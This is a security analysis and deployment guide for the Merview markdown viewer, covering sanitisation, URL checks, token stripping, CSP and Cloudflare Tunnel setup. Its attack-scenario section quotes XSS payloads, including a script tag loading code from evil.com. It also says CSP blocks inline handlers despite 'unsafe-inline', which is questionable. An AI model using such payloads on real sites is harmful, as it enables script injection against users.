# Security Analysis & Cloudflare Tunnel Setup

## Security Assessment

### ✅ Safe to Expose (Good News!)

This application is **relatively safe** to expose via Cloudflare Tunnel because:

1. **100% Client-Side Processing**
   - All markdown rendering happens in the browser
   - No server-side code execution
   - No database or backend
   - No file uploads to server

2. **No Data Storage**
   - Uses browser localStorage only
   - Nothing stored on the server
   - Completely stateless

3. **No User Input Processing on Server**
   - No forms submitted to server
   - No API endpoints
   - Just static file serving

### ✅ XSS Protection via DOMPurify

All user-provided markdown content is sanitized before rendering using [DOMPurify](https://github.com/cure53/DOMPurify), the industry-standard HTML sanitizer.

**What's Protected:**
- `<script>` tags are completely removed
- Event handlers (`onclick`, `onerror`, `onload`, etc.) are stripped
- `javascript:` URLs are neutralized
- Dangerous elements (`<iframe>`, `<object>`, `<embed>`, `<base>`, `<meta>`, `<link>`) are removed
- SVG-based XSS vectors are blocked

**What's Preserved:**
- All standard markdown elements (headings, paragraphs, lists, etc.)
- Safe links (`http://`, `https://`, `mailto:`)
- Images with safe `src` attributes
- Class and ID attributes (needed for syntax highlighting and anchor links)
- Tables and blockquotes
- Code blocks with syntax highlighting

**Implementation:**
```javascript
// In renderer.js
const html = marked.parse(markdown);
wrapper.innerHTML = DOMPurify.sanitize(html);
```

This protection applies to:
- Content typed in the editor
- Content loaded via `?url=` parameter from GitHub/Gist
- Any markdown file opened via the Open button

### ✅ URL Validation Security Strategy

Merview implements a defense-in-depth approach to URL validation, combining multiple security layers to protect users from malicious content while allowing legitimate markdown files from any HTTPS source.

#### **Architecture: Any HTTPS URL Allowed (Issue #201)**

As of issue #201, Merview **no longer uses a domain allowlist** for markdown URLs. Any HTTPS URL can be loaded because:
- All content is sanitized by DOMPurify (removes scripts, dangerous elements, and XSS vectors)
- Multiple validation layers catch malicious URLs before fetch
- Content-Type validation prevents executable content

This makes Merview more useful (can load from any markdown source) while maintaining security through content sanitization rather than source restriction.

#### **URL Loading Security Checks**

**Markdown URLs** (`?url=` parameter) undergo these validations (in `js/security.js`):

1. **HTTPS Protocol Required**
   - All URLs must use HTTPS (encrypted transport)
   - Exception: `localhost` URLs allowed when running in local development
   - Prevents DNS rebinding attacks (localhost-to-localhost only)

2. **URL Length Limit (2048 bytes)**
   - Prevents DoS attacks using extremely long URLs
   - Follows de facto browser/server standards (IE: 2083 chars, most browsers: 32KB+)
   - Checked before URL parsing for efficiency

3. **Credentials Blocked**
   - URLs with embedded credentials (`user:pass@host`) are rejected
   - Security risk: credentials can leak in logs, browser history, referrer headers
   - Enforced via `URL.username` and `URL.password` checks

4. **IDN Homograph Protection**
   - Hostnames must be ASCII-only (no Unicode/punycode)
   - Prevents homograph attacks like `rаw.githubusercontent.com` (Cyrillic 'а' U+0430)
   - Checked **before** URL parsing (browser auto-converts to punycode)
   - Example blocked: `https://rаw.githubusercontent.com/...` (looks like raw.githubusercontent.com)

5. **Fetch Timeout (10 seconds)**
   - Prevents hanging on slow/malicious endpoints
   - Implemented in `js/file-ops.js` using `AbortController`

6. **Content Size Limit (10 MB)**
   - Prevents loading extremely large files
   - Checked during fetch with streaming validation
   - Protects against memory exhaustion attacks

7. **Content-Type Validation**
   - **Allowed types:**
     - `text/*` (text/plain, text/markdown, text/x-markdown)
     - `application/octet-stream` (GitHub's default for raw files)
     - No Content-Type header (some servers don't send it)
   - **Blocked types:**
     - `application/javascript`, `text/javascript` (executable code)
     - `text/html` (could contain scripts)
     - Binary types (application/zip, image/*, etc.)
   - Defense-in-depth check (content still sanitized by DOMPurify)

**CSS URLs** (custom theme loading) use a **stricter allowlist** (in `js/config.js`):

```javascript
export const ALLOWED_CSS_DOMAINS = [
    'cdn.jsdelivr.net',
    'cdnjs.cloudflare.com',
    'raw.githubusercontent.com',
    'gist.githubusercontent.com',
    'unpkg.com'
];
```

CSS uses an allowlist because:
- CSS can't be sanitized by DOMPurify (not HTML content)
- CSS injection can leak data via `url()` (CSS injection attacks)
- Custom properties can exfiltrate data to attacker-controlled servers
- Allowlist ensures CSS comes from trusted CDN/GitHub sources only

#### **GitHub Token Handling (Private Repository Protection)**

When users paste raw URLs from private GitHub repositories, those URLs contain temporary access tokens (`?token=...`). If users share Merview links containing these tokens, they accidentally expose private repository access.

**Protection Measures:**

1. **Token Detection**
   - Merview detects `raw.githubusercontent.com` URLs with `?token=` parameters
   - Detection happens immediately when URL is loaded

2. **Automatic Token Stripping**
   - A security modal immediately appears
   - The token is **immediately stripped from the browser URL bar** (before user can copy it)
   - Uses `history.replaceState()` to replace URL without page reload

3. **User Education Modal**
   - Modal presents two options:
     - **"View Locally Only"**: Content loads without shareable URL
     - **"Share Securely via Gist"**: Creates a public/secret Gist (safe copy)
   - Modal cannot be dismissed without choosing (blocking dialog)

4. **Token Never in Shareable URLs**
   - The `?token=` parameter is stripped before any URL is shareable
   - Prevents accidental token exposure in browser history, copy/paste, or shared links

**What This Protects:**
- Accidental URL sharing with embedded tokens
- Token exposure in browser history
- Copy/paste of tokenized URLs (modal educates users)

**Expected Limitations:**
- Token is still used in the fetch request (required for access, encrypted via HTTPS)
- Users can manually copy the token before modal appears (edge case, requires deliberate action)
- Only protects `raw.githubusercontent.com` URLs (where GitHub puts tokens)

Implementation in `js/security.js`:
```javascript
export function stripGitHubToken(url) {
    try {
        const parsed = new URL(url);
        if (parsed.hostname === 'raw.githubusercontent.com' && parsed.searchParams.has('token')) {
            parsed.searchParams.delete('token');
            return { cleanUrl: parsed.toString(), hadToken: true };
        }
        return { cleanUrl: url, hadToken: false };
    } catch {
        return { cleanUrl: url, hadToken: false };
    }
}
```

#### **Subresource Integrity (SRI)**

All CDN resources are verified using SRI hashes to ensure integrity:

**Libraries Protected:**
- Marked.js (markdown parser)
- Mermaid.js (diagram rendering)
- DOMPurify (HTML sanitization)
- CodeMirror (editor)
- Highlight.js (syntax highlighting)
- All syntax highlighting theme CSS files

**Example SRI Implementation:**
```html
<script src="https://cdn.jsdelivr.net/npm/marked@11.1.1/marked.min.js"
        integrity="sha384-zbcZAIxlvJtNE3Dp5nxLXdXtXyxwOdnILY1TDPVmKFhl4r4nSUG1r8bcFXGVa4Te"
        crossorigin="anonymous"></script>
```

**What SRI Prevents:**
- CDN compromise (attacker replaces CDN files)
- Man-in-the-middle attacks (modified files in transit)
- Accidental file corruption
- Supply chain attacks via CDN

**How It Works:**
- Browser calculates SHA-384 hash of downloaded file
- If hash doesn't match the `integrity` attribute, browser blocks the file
- Application fails safely (no execution of tampered code)

**Syntax Theme SRI Hashes** (in `js/config.js`):
```javascript
export const syntaxThemeSRI = {
    "github-dark": "sha384-wH75j6z1lH97ZOpMOInqhgKzFkAInZPPSPlZpYKYTOqsaizPvhQZmAtLcPKXpLyH",
    "github": "sha384-eFTL69TLRZTkNfYZOLM+G04821K1qZao/4QLJbet1pP4tcF+fdXq/9CdqAbWRl/L",
    // ... additional themes with hashes
};
```

### ⚠️ Security Considerations

**1. Content Security Policy (CSP) - `unsafe-inline` Required**

The CSP includes `'unsafe-inline'` for both `script-src` and `style-src`. This is a known limitation, not a vulnerability:

- **Why it's required:**
  - CodeMirror dynamically generates inline styles for editor rendering
  - Mermaid.js generates inline SVG styles for diagram elements
  - Neither library supports nonce-based CSP

- **Mitigations in place:**
  - All CDN resources use Subresource Integrity (SRI) hashes
  - `frame-src: 'none'` blocks iframe injection
  - `object-src: 'none'` blocks plugin-based attacks
  - Script sources restricted to specific CDN domains

- **Future improvements:**
  - CodeMirror 6 may offer better CSP support
  - Could investigate `unsafe-hashes` with specific hash values

### 🛡️ Defense-in-Depth: How CSP and DOMPurify Work Together

Merview uses a **defense-in-depth security strategy** with two complementary layers of XSS protection. Each layer catches different types of attacks, and together they provide robust protection even if one layer fails.

**Layer 1: DOMPurify (Application-Level Defense)**

DOMPurify is the first line of defense, operating at the application level:

- **When it activates:** Every time markdown is rendered to HTML (before DOM insertion)
- **What it does:** Sanitizes HTML by removing dangerous elements, attributes, and JavaScript
- **Strength:** Extremely thorough HTML sanitization with active maintenance against new XSS vectors
- **Limitation:** Runs in JavaScript, so theoretically vulnerable if an attacker could compromise the sanitizer itself

**Layer 2: Content Security Policy (Browser-Level Defense)**

CSP is the second line of defense, enforced by the browser itself:

- **When it activates:** Browser enforces restrictions on all page resources and scripts
- **What it does:** Blocks unauthorized script execution, restricts resource loading to trusted domains
- **Strength:** Browser-native enforcement that can't be bypassed by JavaScript, blocks inline scripts/eval by default
- **Limitation:** Requires `'unsafe-inline'` for CodeMirror and Mermaid.js, which weakens protection against inline script injection

**How They Complement Each Other:**

1. **If DOMPurify is bypassed:** CSP still blocks:
   - External script loading from unauthorized domains (only CDNs in `script-src` are allowed)
   - Iframe injection (`frame-src: 'none'`)
   - Object/embed attacks (`object-src: 'none'`)
   - Base tag hijacking (`base-uri: 'self'`)

2. **If CSP's `unsafe-inline` is exploited:** DOMPurify still blocks:
   - Script tags in user content
   - Event handlers (onclick, onerror, etc.)
   - JavaScript: URLs in links
   - Dangerous elements before they reach the DOM

3. **Combined protection against:**
   - **SVG-based XSS:** DOMPurify removes dangerous SVG scripts; CSP blocks unauthorized script execution
   - **CDN compromise:** Subresource Integrity (SRI) hashes verify CDN resources; CSP limits which CDNs are trusted
   - **Markdown injection:** DOMPurify sanitizes markdown-generated HTML; CSP restricts what that HTML can do
   - **CSS injection attacks:** DOMPurify filters dangerous style attributes; CSP limits style sources

**Why CSP Still Requires `unsafe-inline`:**

Despite `unsafe-inline` weakening CSP's protection, it's required for legitimate application functionality:

- **CodeMirror:** Dynamically generates inline styles for syntax highlighting, cursor positioning, and editor rendering. These styles are critical for the editor to function and cannot use nonce-based CSP.
- **Mermaid.js:** Generates inline styles within SVG diagram elements for colors, positioning, and formatting. The Mermaid rendering engine doesn't support CSP nonces.

Neither library offers nonce-based or hash-based CSP support, making `unsafe-inline` unavoidable for this application's core functionality.

**Security Trade-off Analysis:**

- **Risk:** `unsafe-inline` allows any inline scripts/styles if they reach the DOM
- **Mitigation:** DOMPurify prevents malicious inline scripts from ever reaching the DOM
- **Result:** The risk is acceptable because the first layer (DOMPurify) specifically targets this attack vector
- **Future:** If CodeMirror 6 or Mermaid.js add CSP nonce support, we can remove `unsafe-inline` and strengthen CSP

**Real-World Attack Scenario:**

Imagine an attacker tries to inject `<img src=x onerror="alert('XSS')">`:

1. **DOMPurify layer:** Strips the `onerror` handler → `<img src=x>`
2. **CSP layer:** Even if the handler survived, CSP blocks inline event handlers (best effort despite `unsafe-inline` for scripts)
3. **Result:** Attack fails at multiple points

Or if an attacker tries to inject `<script src="https://evil.com/malicious.js"></script>`:

1. **DOMPurify layer:** Removes the entire `<script>` tag
2. **CSP layer:** Even if it survived, CSP blocks `evil.com` (not in `script-src` allowlist)
3. **Result:** Two independent failures for the attacker

This layered approach means an attacker must find vulnerabilities in BOTH DOMPurify's sanitization logic AND CSP's browser enforcement to successfully execute an XSS attack—a significantly higher bar than defeating a single security control.

**2. No Authentication (Current)**
- Anyone with the URL can access it
- Suitable for public tools, not for private documents

**3. Public Access**
- Once exposed, anyone on the internet can use it
- They can render their own markdown
- They CANNOT access your documents (everything is client-side)

**4. Bandwidth Usage**
- People could use it heavily
- Cloudflare provides DDoS protection
- Rate limiting recommended

**5. Private Repository Token Protection**

See the comprehensive "GitHub Token Handling (Private Repository Protection)" section above for full details on how Merview protects users from accidentally exposing private repository access tokens.

**6. Content-Type Validation (Defense-in-Depth)**

When loading remote markdown via the `?url=` parameter, Merview validates the HTTP Content-Type header to provide an additional security layer beyond DOMPurify sanitization.

- **What it does:**
  - Inspects the Content-Type header from the remote server
  - Blocks content types that are inherently executable or binary
  - Allows only text-based content types suitable for markdown
  - Works as defense-in-depth alongside DOMPurify sanitization

- **What it blocks:**
  - JavaScript types: `application/javascript`, `text/javascript`, `application/x-javascript`
  - HTML content: `text/html` (could contain inline scripts before sanitization)
  - VBScript: `text/vbscript` (legacy Windows IE scripting)
  - Binary content: Any MIME type not explicitly allowed (e.g., `image/*`, `application/zip`)

- **What it allows:**
  - All text types: `text/*` (including `text/plain`, `text/markdown`, `text/x-markdown`)
  - Generic binary: `application/octet-stream` (GitHub's default for raw files)
  - Missing headers: Servers that don't send Content-Type headers (graceful handling)

- **Defense-in-depth context:**
  - This is NOT the primary security control (DOMPurify sanitization is)
  - Provides an early rejection layer before content reaches the sanitizer
  - Complements other security layers:
    1. HTTPS enforcement (prevents MITM attacks)
    2. URL validation (blocks credentials, IDN homographs, excessive length)
    3. Fetch limits (10-second timeout, 10 MB size limit)
    4. **Content-Type validation** (blocks executable/binary types)
    5. DOMPurify sanitization (removes dangerous HTML/scripts from content)

- **Limitations:**
  - Relies on server sending truthful Content-Type headers
  - A malicious server could send executable JavaScript with `Content-Type: text/plain`
  - This is why DOMPurify sanitization is still essential (defense-in-depth)
  - Does not protect against social engineering (users loading malicious content intentionally)

**Implementation:**
```javascript
// In file-ops.js
export function isValidMarkdownContentType(contentType) {
    if (!contentType) return true;  // No header is acceptable

    const mimeType = contentType.split(';')[0].trim().toLowerCase();

    // Block dangerous types
    const blockedTypes = [
        'application/javascript',
        'text/javascript',
        'text/html',
        'application/x-javascript',
        'text/vbscript'
    ];
    if (blockedTypes.includes(mimeType)) return false;

    // Allow text/* and application/octet-stream
    return mimeType.startsWith('text/') ||
           mimeType === 'application/octet-stream';
}
```

## Security Levels

### Level 1: Basic (Current - Default)
**Good for:** Personal use, internal tools, trusted users

**Security:**
- ✅ Basic security headers
- ✅ Hidden file protection
- ❌ No authentication
- ❌ No rate limiting
- ❌ No CSP

**Use:** `nginx.conf` (current default)

---

### Level 2: Enhanced (Recommended for Public)
**Good for:** Public exposure via Cloudflare Tunnel

**Security:**
- ✅ Enhanced security headers
- ✅ Content Security Policy (CSP)
- ✅ Rate limiting (10 req/sec)
- ✅ Hidden file protection
- ✅ Version hiding
- ❌ No authentication

**Use:** `nginx-secure.conf`

---

### Level 3: Password Protected (Most Secure)
**Good for:** Private use, sensitive content

**Security:**
- ✅ All Level 2 features
- ✅ Basic HTTP authentication (username/password)
- ✅ Locked down access

**Use:** `nginx-with-auth.conf`

---

## Switching Security Levels

### Option 1: Use Enhanced Security (No Auth)

```dockerfile
# Edit Dockerfile, change line:
COPY --chmod=644 nginx.conf /etc/nginx/conf.d/default.conf

# To:
COPY --chmod=644 nginx-secure.conf /etc/nginx/conf.d/default.conf
```

Then rebuild:
```bash
docker-compose down
docker-compose build --no-cache
docker-compose up -d
```

### Option 2: Add Password Protection

**Step 1:** Create password file
```bash
# Install htpasswd (if needed)
# Mac: brew install httpd
# Linux: sudo apt-get install apache2-utils

# Create password file
htpasswd -c .htpasswd yourusername
# Enter password when prompted
```

**Step 2:** Update Dockerfile
```dockerfile
# Add after the COPY commands:
COPY --chmod=644 nginx-with-auth.conf /etc/nginx/conf.d/default.conf
COPY --chmod=644 .htpasswd /etc/nginx/.htpasswd
```

**Step 3:** Update .dockerignore
Remove `.htpasswd` from .dockerignore (if present)

**Step 4:** Rebuild
```bash
docker-compose down
docker-compose build --no-cache
docker-compose up -d
```

Now users will need to enter username/password to access.

---

## Cloudflare Tunnel Best Practices

### 1. Use Cloudflare Access (Recommended)

Instead of basic auth, use Cloudflare Access for better security:

- Add authentication via Google/GitHub/Email
- Set access policies (who can access)
- Audit logs
- No password to remember

**Setup:** In Cloudflare Zero Trust dashboard → Access → Applications

### 2. Cloudflare WAF Rules

Add Web Application Firewall rules:
- Rate limiting (already have nginx rate limiting, but extra layer)
- Bot protection
- Geographic restrictions
- Custom rules

### 3. Cloudflare Cache Settings

Set proper caching:
- Cache static assets (JS, CSS)
- Don't cache HTML (dynamic content)

---

## What Can/Cannot Be Compromised

### ✅ Safe (Cannot Be Compromised)

1. **Your Documents**
   - Nothing is stored on server
   - All content in user's browser only
   - Each user sees only what they type

2. **User Data**
   - No user accounts
   - No personal information collected
   - No cookies or tracking

3. **Server Data**
   - No database to hack
   - No backend to exploit
   - Just static HTML/JS/CSS

### ⚠️ Potential Risks

1. **Bandwidth Abuse**
   - Users could hammer the server
   - **Mitigation:** Rate limiting, Cloudflare DDoS protection

2. **Resource Usage**
   - Heavy Mermaid diagram rendering
   - **Mitigation:** Cloudflare's CDN, rate limiting

3. **Someone Uses It**
   - Others can render their markdown
   - **Impact:** Minimal - just bandwidth
   - **Mitigation:** Add authentication if unwanted

---

## Comparison: Security Levels

| Feature | Basic | Enhanced | With Auth |
|---------|-------|----------|-----------|
| Security Headers | Basic | Full | Full |
| CSP | ❌ | ✅ | ✅ |
| Rate Limiting | ❌ | ✅ | ✅ |
| Password | ❌ | ❌ | ✅ |
| Public Access | Yes | Yes | No |
| Best For | Local | Public Tool | Private |

---

## Recommended Setup for Cloudflare Tunnel

**For Public Sharing (anyone can use):**
1. Use `nginx-secure.conf` (Enhanced security)
2. Enable Cloudflare WAF
3. Monitor usage in Cloudflare Analytics
4. Set up rate limiting in Cloudflare

**For Private Use (only you/team):**
1. Use `nginx-with-auth.conf` OR Cloudflare Access
2. Cloudflare Access is better (SSO, audit logs)
3. Still enable WAF and monitoring

---

## Quick Security Checklist

Before exposing via Cloudflare:

- [ ] Decide: Public tool or private?
- [ ] Choose security level (Basic/Enhanced/Auth)
- [ ] Update nginx config if needed
- [ ] Rebuild Docker container
- [ ] Test locally first
- [ ] Set up Cloudflare Tunnel
- [ ] Enable Cloudflare WAF (recommended)
- [ ] Consider Cloudflare Access for private use
- [ ] Monitor traffic in first week
- [ ] Check Cloudflare Analytics for abuse

---

## Bottom Line

### ✅ Safe to Expose Because:
- No backend processing
- No data storage
- No user information collected
- Completely client-side
- Stateless application

### ⚠️ Considerations:
- Add rate limiting (use Enhanced config)
- Consider authentication for private use
- Monitor bandwidth usage
- Use Cloudflare's security features

**Recommendation:** Use Enhanced security (`nginx-secure.conf`) for public exposure, or add Cloudflare Access for private use.

The application itself is secure - the main consideration is controlling WHO can access it and preventing bandwidth abuse.
